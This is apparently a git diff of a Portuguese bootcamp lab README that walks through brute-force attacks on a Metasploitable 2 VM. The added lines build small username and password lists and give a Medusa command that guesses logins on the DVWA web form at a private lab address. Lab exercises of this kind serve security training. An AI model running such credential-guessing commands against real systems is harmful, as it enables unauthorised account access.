@@ -2,7 +2,7 @@
 
 Um projeto do bootcamp Riachuelo Cibersegurança na plataforma de ensino DIO.
 1. ![Força bruta em FTP](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/README.md#for%C3%A7a-bruta-em-ftp)
-2. Automação de tentativas em formulário Web
+2. ![Automação de tentativas em formulário Web](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/tree/main#automa%C3%A7%C3%A3o-de-tentativas-em-formul%C3%A1rio-web)
 3. Password Spraying em SMB
 
 ## Força bruta em FTP
@@ -77,7 +77,7 @@ No nosso canto inferior esquerdo veremos os parâmetros que foram usados na tent
 
 ![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-15-51.png)
 
-Agora faremos nosso novo dicionário de palavras para ser usado no ataque com dicinário, use os comandos:
+Agora faremos nosso novo dicionário de palavras para ser usado no ataque com dicionário, use os comandos:
 ~~~bash
 echo -e "user\nmsfadmin\nadmin\nroot" > usuarios_web.txt
 echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas_web.txt
@@ -85,9 +85,19 @@ echo -e "123456\npassword\nqwerty\nmsfadmin" > senhas_web.txt
 
 ![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-22-14.png)
 
+Usando o Medusa novamente para fazer o ataque de força bruta, use o seguinte comando:
+~~~bash
+medusa -h 192.168.56.102 -U usuarios_web.txt -P senhas_web.txt -M http \ -m PAGE: '/dvwa/login.php' \ -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' -t 6 | grep 'SUCCESS'
+~~~
+Você verá um resultado como o da tela abaixo:
+
 ![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-44-06.png)
 
+Agora use as credencias encontradas e tente logar novamente. Se o login for bem sucedido você verá uma tela semelhante a essa:
+
 ![](https://github.com/flanubit/DIO-brute-force-com-medusa-na-vm-metasploitable-2/blob/main/images/Screenshot_2026-03-06_12-45-51.png)
+
+Tudo certo, você conseguiu acesso ao sistema web.
 
 ## Password Spraying em SMB
 
